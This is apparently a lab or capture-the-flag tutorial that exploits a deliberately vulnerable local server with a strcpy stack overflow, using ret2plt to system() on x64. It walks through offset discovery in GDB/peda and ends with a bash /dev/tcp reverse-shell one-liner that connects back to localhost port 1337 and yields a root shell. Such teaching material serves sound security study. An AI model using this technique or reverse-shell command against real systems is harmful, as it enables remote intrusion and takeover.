# Simple remote buffer overflow exploit - ASLR/DEP/64bit

## Introduction

We will create a functional exploit for a 64 bit program with a stack overflow vulnerability and enabled ASLR and DEP.
This includes finding the vulnerability, get all necessary information for our exploit, and create a sample exploit as
python program.

We will use `system()` in LIBC by implementing the ret2plt / ret2libc exploit technique.


## Goal

* Implement a fully working exploit for x64 + ASLR + DEP by using ret2plt (ret2libc)
* Get our static and dynamic analysis skills to the next level

## Vulnerability

We have a server which is listening on port 5001. For each connection it will
fork and execute the following code:

```c
int handleData(char *username, char *password) {
        char firstname[256];

        strcpy(firstname, username);

        if (memcmp(username, "secret", 6) == 0) {
                return 1;
        } else {
                return 0;
        }
}

void doprocessing (int sock) {
        char username[1024];
        char password[1024];

        printf("Client connected\n");

        bzero(username, sizeof(username));
        bzero(password, sizeof(password));

        int n;

        n = read(sock, username, 1023);
        printf("Received username with len %i\n", n);

        handleData(username, password);
}
```

The overflow is happening at the `strcpy()`.

## Start server

We start the vulnerable server in the background, and attach it with GDB to the pid:

```
root@hlUbuntu64:~/challenges/challenge15# ./challenge15 &
[1] 17147
root@hlUbuntu64:~/challenges/challenge15# Listen on port: 5001

root@hlUbuntu64:~/challenges/challenge15# echo $!
17147
root@hlUbuntu64:~/challenges/challenge15# gdb -q
gdb-peda$ attach 17147
[...]
gdb-peda$ set follow-fork-mode child
gdb-peda$
```

Note that the server is paused right now, because we want to  issue another GDB
command. But we could continue it with `c`.

## Find offset

As first step, we can create a peda pattern, which makes it easier for us to identify
the offset to SIP. It should be bigger that the destination buffer (256 bytes in our case).  
```
gdb-peda$ pattern create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
```

We attached GDB to the server process, which paused the process. We also told GDB to follow children.
Lets continue the process:
```
gdb-peda$ c
Continuing.
```

The server is now unpaused. Lets send the peda pattern to the server:
```
root@hlUbuntu64:~/challenges/challenge15# echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%' | nc localhost 5001
```

We have the following output in GDB:

```
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x73 ('s')
RDX: 0x6
RSI: 0x400c9e --> 0x20746e65696c4300 ('')
RDI: 0x7fffffffdff6 ("sAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A"...)
RBP: 0x2541322541632541 ('A%cA%2A%')
RSP: 0x7fffffffdbd8 ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n")
RIP: 0x4009c2 (<handleData+92>: ret)
R8 : 0x0
R9 : 0x138
R10: 0x37d
R11: 0x7ffff7ba2730 --> 0xfffda400fffda12f
R12: 0x400870 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
  0x4009ba <handleData+84>:    jmp    0x4009c1 <handleData+91>
  0x4009bc <handleData+86>:    mov    eax,0x0
  0x4009c1 <handleData+91>:    leave
=> 0x4009c2 <handleData+92>:    ret
  0x4009c3 <doprocessing>:     push   rbp
  0x4009c4 <doprocessing+1>:   mov    rbp,rsp
  0x4009c7 <doprocessing+4>:   sub    rsp,0x820
  0x4009ce <doprocessing+11>:  mov    DWORD PTR [rbp-0x814],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdbd8 ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n")
0008| 0x7fffffffdbe0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n")
0016| 0x7fffffffdbe8 ("A%JA%fA%5A%KA%gA%6A%\n")
0024| 0x7fffffffdbf0 ("5A%KA%gA%6A%\n")
0032| 0x7fffffffdbf8 --> 0xa25413625 ('%6A%\n')
0040| 0x7fffffffdc00 --> 0x0
0048| 0x7fffffffdc08 --> 0x0
0056| 0x7fffffffdc10 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009c2 in handleData ()
gdb-peda$
```

peda has the function `pattern_search`, which searches for the peda-pattern wherever it can:

```
gdb-peda$ pattern_search
Registers contain pattern buffer:
RBP+0 found at offset: 256
Registers point to pattern buffer:
[RDI] --> offset 6 - size ~203
[RSP] --> offset 264 - size ~38
Pattern buffer found at:
0x0060301a : offset    0 - size  300 ([heap])
0x00007fffffffd968 : offset  203 - size    4 ($sp + -0x270 [-156 dwords])
[...]
```

It didnt not find the pattern in RIP, but RSP is pointing 264 bytes into the pattern.

Lets try it again with a pattern of 264+4=268 bytes:

```
gdb-peda$ pattern create 268
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%d'
gdb-peda$ attach 17147
[...]
gdb-peda$ c
```

Send the (now smaller) pattern to the server:
```
root@hlUbuntu64:~/challenges/challenge15# echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%d' | nc localhost 5001
```

And investigate it again:
```
gdb-peda$ pattern_search
Registers contain pattern buffer:
RBP+0 found at offset: 256
RIP+0 found at offset: 264
Registers point to pattern buffer:
[RDI] --> offset 6 - size ~203
Pattern buffer found at:
0x0060301a : offset    0 - size  268 ([heap])
[...]
```

Our assumption was correct. `RIP+0` is pointing 264 bytes into our generated pattern.
Therefore the offset is 264 bytes.

We can verify this. Lets print 264 times 'A', followed with 4 times "B".
```
root@hlUbuntu64:~/challenges/challenge15# perl -e 'print "A" x 264 . "BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBroot@hlUbuntu64:~/challenges/challenge15#
root@hlUbuntu64:~/challenges/challenge15# perl -e 'print "A" x 264 . "BBBB"' | nc localhost 5001
```

Result:
```
Stopped reason: SIGSEGV
0x0000000042424242 in ?? ()
```

As the letter B is hex 0x42, we see that we have the correct offset.

## Address of system()

We can just print the address of `system()` after the program started.
Note that it has to begin with `0x40` (the code section is starting at `0x00400000`).
```
root@hlUbuntu64:~/challenges/challenge15# gdb -q ./challenge15
gdb-peda$ print &system
$1 = (<text variable, no debug info> *) 0x4007b0 <system@plt>
```

A wrong address:
```
gdb-peda$ print &system
$1 = (<text variable, no debug info> *) 0x7ffff7a53380 <__libc_system>
```

Here we just print the address of system in the memory mapped LIBC-2.23.so:
```
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /root/challenges/challenge15/challenge15
0x00601000         0x00602000         r--p      /root/challenges/challenge15/challenge15
0x00602000         0x00603000         rw-p      /root/challenges/challenge15/challenge15
0x00603000         0x00624000         rw-p      [heap]
0x00007ffff7a0e000 0x00007ffff7bce000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bce000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fee000 0x00007ffff7ff1000 rw-p      mapped
0x00007ffff7ff6000 0x00007ffff7ff8000 rw-p      mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p      [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
```

I also inserted a (useless) system() function in the main() function. We can deduct
the address from the disassembly:

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400a95 <+0>:     push   rbp
   0x0000000000400a96 <+1>:     mov    rbp,rsp
   0x0000000000400a99 <+4>:     sub    rsp,0x160
   0x0000000000400aa0 <+11>:    mov    DWORD PTR [rbp-0x154],edi
   0x0000000000400aa6 <+17>:    mov    QWORD PTR [rbp-0x160],rsi
   0x0000000000400aad <+24>:    mov    edi,0x400d0f
   0x0000000000400ab2 <+29>:    call   0x4007b0 <system@plt>
[...]
```

As we can see, the call instruction has a hardcoded address 0x4007b0 with the symbol system@plt.




## Shellcode

`system()` executes binary. We just use bash, and use a special bash oneliner to create a
connect-back shell:

```
shellcode = "0<&181-;exec 181<>/dev/tcp/127.0.0.1/1337;sh <&181 >&181 2>&181"
shellcode =  'bash -c "' + shellcode + '" #'
```

## Exploit

Lets try the exploit:

Start the server:
```
root@hlUbuntu64:~/challenges/challenge15# ./challenge15
Listen on port: 5001
```

Start a listener:
```
root@hlUbuntu64:~/challenges/challenge15# nc -l -p 1337
```

And start the exploit:
```
root@hlUbuntu64:~/challenges/challenge15# ./challenge15-exp.py | nc localhost 5001
```

The server has some strange error messages:
```
Client connected
Received username with len 267
bash: redirection error: cannot duplicate fd: Bad file descriptor
bash: 181: Bad file descriptor
```

But you can enter commands into the netcast listener:
```
root@hlUbuntu64:~/challenges/challenge15# nc -l -p 1337

ls
challenge15
challenge15.c
challenge15-exp.py
Makefile
peda-session-challenge15.txt
id
uid=0(root) gid=0(root) groups=0(root)
^C
root@hlUbuntu64:~/challenges/challenge15# nc -l -p 1337
ls
challenge15
challenge15.c
challenge15-exp.py
Makefile
peda-session-challenge15.txt
```

## Why does it work?

Lets set a breakpoint before the `ret` of the vulnerable function:

```
gdb-peda$ disas handleData
Dump of assembler code for function handleData:
   0x00000000004009a6 <+0>:     push   rbp
   0x00000000004009a7 <+1>:     mov    rbp,rsp
   0x00000000004009aa <+4>:     sub    rsp,0x110
   0x00000000004009b1 <+11>:    mov    QWORD PTR [rbp-0x108],rdi
   0x00000000004009b8 <+18>:    mov    QWORD PTR [rbp-0x110],rsi
   0x00000000004009bf <+25>:    mov    rdx,QWORD PTR [rbp-0x108]
   0x00000000004009c6 <+32>:    lea    rax,[rbp-0x100]
   0x00000000004009cd <+39>:    mov    rsi,rdx
   0x00000000004009d0 <+42>:    mov    rdi,rax
   0x00000000004009d3 <+45>:    call   0x400780 <strcpy@plt>
   0x00000000004009d8 <+50>:    mov    rax,QWORD PTR [rbp-0x108]
   0x00000000004009df <+57>:    mov    edx,0x6
   0x00000000004009e4 <+62>:    mov    esi,0x400cd8
   0x00000000004009e9 <+67>:    mov    rdi,rax
   0x00000000004009ec <+70>:    call   0x400810 <memcmp@plt>
   0x00000000004009f1 <+75>:    test   eax,eax
   0x00000000004009f3 <+77>:    jne    0x4009fc <handleData+86>
   0x00000000004009f5 <+79>:    mov    eax,0x1
   0x00000000004009fa <+84>:    jmp    0x400a01 <handleData+91>
   0x00000000004009fc <+86>:    mov    eax,0x0
   0x0000000000400a01 <+91>:    leave
   0x0000000000400a02 <+92>:    ret
End of assembler dump.
gdb-peda$ b *0x0000000000400a02
Breakpoint 1 at 0x400a02
gdb-peda$ c
```

Send an overly long string:
```
root@hlUbuntu64:~/challenges/challenge15# perl -e 'print "A" x 264 . "BBBB"' | nc localhost 5001
```

And check the output of gdb/peda:
```
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x73 ('s')
RDX: 0x6
RSI: 0x400cde --> 0x20746e65696c4300 ('')
RDI: 0x7fffffffdff6 ('A' <repeats 200 times>...)
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdbd8 --> 0x42424242 ('BBBB')
RIP: 0x400a02 (<handleData+92>: ret)
R8 : 0x0
R9 : 0x1f
R10: 0x37d
R11: 0x7ffff7ba2730 --> 0xfffda400fffda12f
R12: 0x4008b0 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
  0x4009fa <handleData+84>:    jmp    0x400a01 <handleData+91>
  0x4009fc <handleData+86>:    mov    eax,0x0
  0x400a01 <handleData+91>:    leave
=> 0x400a02 <handleData+92>:    ret
  0x400a03 <doprocessing>:     push   rbp
  0x400a04 <doprocessing+1>:   mov    rbp,rsp
  0x400a07 <doprocessing+4>:   sub    rsp,0x820
  0x400a0e <doprocessing+11>:  mov    DWORD PTR [rbp-0x814],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdbd8 --> 0x42424242 ('BBBB')
0008| 0x7fffffffdbe0 --> 0x6e0000005d (']')
0016| 0x7fffffffdbe8 --> 0x400000000
0024| 0x7fffffffdbf0 --> 0x0
0032| 0x7fffffffdbf8 --> 0x0
0040| 0x7fffffffdc00 --> 0x0
0048| 0x7fffffffdc08 --> 0x0
0056| 0x7fffffffdc10 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 2.1 "challenge15" hit Breakpoint 1, 0x0000000000400a02 in handleData ()
```

The next value on the stack is 0x42424242, which will be our new RIP.
We will execute the syscall "system()". The call convention for syscalls defines that
the first argument for the system is stored in `%rdi`. `system()` only uses one argument:

```
NAME
       system - execute a shell command

SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);
```

So, we are in the process of executing `system()` - where does `%rdi` point to?
We see it already above in the peda output, but lets check it again:
```
gdb-peda$ x/40g $rdi
0x7fffffffdff6: 0x4141414141414141      0x4141414141414141
0x7fffffffe006: 0x4141414141414141      0x4141414141414141
0x7fffffffe016: 0x4141414141414141      0x4141414141414141
0x7fffffffe026: 0x4141414141414141      0x4141414141414141
0x7fffffffe036: 0x4141414141414141      0x4141414141414141
0x7fffffffe046: 0x4141414141414141      0x4141414141414141
0x7fffffffe056: 0x4141414141414141      0x4141414141414141
0x7fffffffe066: 0x4141414141414141      0x4141414141414141
0x7fffffffe076: 0x4141414141414141      0x4141414141414141
0x7fffffffe086: 0x4141414141414141      0x4141414141414141
0x7fffffffe096: 0x4141414141414141      0x4141414141414141
0x7fffffffe0a6: 0x4141414141414141      0x4141414141414141
0x7fffffffe0b6: 0x4141414141414141      0x4141414141414141
0x7fffffffe0c6: 0x4141414141414141      0x4141414141414141
0x7fffffffe0d6: 0x4141414141414141      0x4141414141414141
0x7fffffffe0e6: 0x4141414141414141      0x4141414141414141
0x7fffffffe0f6: 0x0000424242424141      0x0000000000000000
0x7fffffffe106: 0x0000000000000000      0x0000000000000000
```

It accidently points exactly to our provided shellcode. How convenient!
